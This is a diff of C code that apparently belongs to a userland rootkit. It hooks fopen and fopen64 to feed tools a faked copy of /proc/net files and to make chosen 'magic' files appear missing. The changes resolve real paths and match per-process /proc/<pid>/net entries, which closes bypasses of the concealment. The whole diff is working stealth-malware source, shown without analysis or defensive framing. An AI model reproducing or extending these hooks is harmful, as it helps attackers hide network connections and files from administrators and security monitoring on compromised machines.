@@ -44,7 +44,7 @@ int is_magicfile(const char *filename){
 }
 
 int is_net_file(const char *pathname){
-    return matches_reg("^/proc/net/[a-z0-9]+$", pathname);
+    return matches_reg("^/proc(/[0-9]+)?/net/[a-z0-9]+$", pathname);
 }
 
 int fake_netstat(FILE *(*f)(const char *pathname, const char *mode), char *pathname, const char *mode, char *newfile){
@@ -118,21 +118,21 @@ FILE *fopen(const char *pathname, const char *mode)
 		hooked_fopen = 	load_libc("fopen");
 	}
 
-    // char real_pathname[PATH_MAX];
-    // realpath(pathname,real_pathname);
+    char real_pathname[PATH_MAX];
+    realpath(pathname,real_pathname);
 
-    if (is_net_file(pathname)){
+    if (is_net_file(real_pathname)){
         char newfile[PATH_MAX];
-        if (!fake_netstat(hooked_fopen, pathname, mode, newfile)){
+        if (!fake_netstat(hooked_fopen, real_pathname, mode, newfile)){
             return NULL;
         }
         return hooked_fopen(newfile, mode);
-    } else if (is_magicfile(pathname)){
+    } else if (is_magicfile(real_pathname)){
         errno = ENOENT;
         return NULL;
     }
 
-	return hooked_fopen(pathname, mode);
+	return hooked_fopen(real_pathname, mode);
 }
 
 
@@ -146,21 +146,21 @@ FILE *fopen64(const char *pathname, const char *mode)
 		hooked_fopen64 = load_libc("fopen64");
 	}
 
-    // char real_pathname[PATH_MAX];
-    // realpath(pathname,real_pathname);
+    char real_pathname[PATH_MAX];
+    realpath(pathname,real_pathname);
 
-    if (is_net_file(pathname)){
+    if (is_net_file(real_pathname)){
         char newfile[PATH_MAX];
-        if (!fake_netstat(hooked_fopen64, pathname, mode, newfile)){
+        if (!fake_netstat(hooked_fopen64, real_pathname, mode, newfile)){
             return NULL;
         }
 	    return hooked_fopen64(newfile, mode);
-    } else if (is_magicfile(pathname)){
+    } else if (is_magicfile(real_pathname)){
         errno = ENOENT;
         return NULL;
     }
  
-	return hooked_fopen64(pathname, mode);
+	return hooked_fopen64(real_pathname, mode);
 }
 
 int is_flag_set(int fd, unsigned long flags){
